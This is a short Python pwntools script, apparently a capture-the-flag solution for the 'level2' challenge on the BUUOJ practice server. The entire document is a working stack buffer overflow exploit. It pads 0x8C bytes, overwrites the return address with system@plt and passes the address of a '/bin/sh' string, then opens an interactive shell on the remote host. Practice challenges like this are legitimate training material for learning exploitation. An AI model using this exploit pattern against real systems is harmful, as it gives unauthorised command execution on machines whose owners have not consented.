from pwn import *

elf = ELF('level2')
# io = process('level2')
io = remote('node4.buuoj.cn', 28249)
bin_sh_addr = 0x0804A024
system_addr = elf.plt['system']

io.recv()
payload = cyclic(0x8C) + p32(system_addr) + cyclic(4) + p32(bin_sh_addr)
io.sendline(payload)
io.interactive() 
